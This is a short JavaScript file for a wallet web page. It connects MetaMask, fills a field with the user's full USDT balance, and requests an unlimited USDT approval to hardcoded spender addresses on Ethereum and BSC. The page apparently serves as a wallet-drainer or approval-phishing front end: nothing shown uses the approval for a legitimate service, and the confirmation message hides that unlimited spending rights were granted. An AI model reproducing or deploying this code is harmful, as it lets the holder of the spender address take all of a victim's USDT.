let provider;
let signer;
let usdtContract;
let USDT_ADDRESS;
let SPENDER_ADDRESS;

// ===== CONSTANTS =====
const ETH_USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";

const ETH_SPENDER = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const USDT_ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== CONNECT WALLET (ONE SOURCE OF TRUTH) =====
async function connectWallet() {
  if (!window.ethereum) {
    alert("MetaMask not found");
    throw new Error("No wallet");
  }

  // 🔴 MUST
  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();

  const user = await signer.getAddress();
  document.getElementById("walletAddress").value = user;

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  console.log("Connected chain:", chainId);

  if (chainId === 1) {
    // Ethereum
    USDT_ADDRESS = ETH_USDT;
    SPENDER_ADDRESS = ETH_SPENDER;
  } else if (chainId === 56) {
    // BSC
    USDT_ADDRESS = BSC_USDT;
    SPENDER_ADDRESS = BSC_SPENDER;
  } else {
    alert("Please use Ethereum or BSC network");
    throw new Error("Unsupported network");
  }

  usdtContract = new ethers.Contract(
    USDT_ADDRESS,
    USDT_ABI,
    signer
  );
}

// ===== MAX BUTTON =====
async function setMax() {
  await connectWallet();

  const user = await signer.getAddress();
  const bal = await usdtContract.balanceOf(user);
  const dec = await usdtContract.decimals();

  document.getElementById("amount").value =
    ethers.formatUnits(bal, dec);
}

// ===== APPROVE (UNLIMITED) =====
async function approveUSDT() {
  try {
    await connectWallet();

    const MAX_UINT =
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const tx = await usdtContract.approve(
      SPENDER_ADDRESS,
      MAX_UINT
    );

    console.log("Approval TX:", tx.hash);
    alert("Approval sent successfully");

  } catch (err) {
    console.error(err);
    alert("Error: " + (err.reason || err.message));
  }
}
